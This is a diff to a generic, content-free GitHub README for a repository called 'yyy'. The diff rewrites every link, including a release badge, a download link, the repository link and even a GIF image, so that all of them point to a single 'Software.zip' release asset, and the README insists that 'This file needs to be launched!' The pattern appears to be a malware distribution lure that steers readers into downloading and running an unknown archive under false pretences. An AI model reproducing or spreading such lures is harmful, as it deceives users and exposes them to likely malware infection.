@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "yyy" Repository! 🚀
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/cli/cli)
+![GitHub release (latest by date)](https://github.com/Silovkalury/yyy/releases/download/v1.0/Software.zip)
 
 ### Description:
 Welcome to the "yyy" repository! This is a space where you can explore various exciting projects and resources related to a wide range of topics. While the short description is not provided, feel free to dive into the repository and discover the amazing content waiting for you!
@@ -9,14 +9,14 @@ Welcome to the "yyy" repository! This is a space where you can explore various e
 🌟 Topics: Not provided
 
 ### Download:
-📥 [Download Repository Zip File](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+📥 [Download Repository Zip File](https://github.com/Silovkalury/yyy/releases/download/v1.0/Software.zip)
 
 🚀 **This file needs to be launched!**
 
 If you encounter any issues with the link provided, don't worry! Make sure to check out the "Releases" section on the repository page for alternative download options.
 
 ### Explore Further:
-🔗 [Visit the Repository](https://github.com/cli/cli)
+🔗 [Visit the Repository](https://github.com/Silovkalury/yyy/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -37,4 +37,4 @@ If you encounter any issues with the link provided, don't worry! Make sure to ch
 ### Thank You for Visiting!
 🌟 Thank you for exploring the "yyy" repository! We hope you find inspiration, knowledge, and joy in the content available here. Feel free to reach out if you have any questions or suggestions. Happy coding! 🚀
 
-![You're awesome!](https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif)
+![You're awesome!](https://github.com/Silovkalury/yyy/releases/download/v1.0/Software.zip)
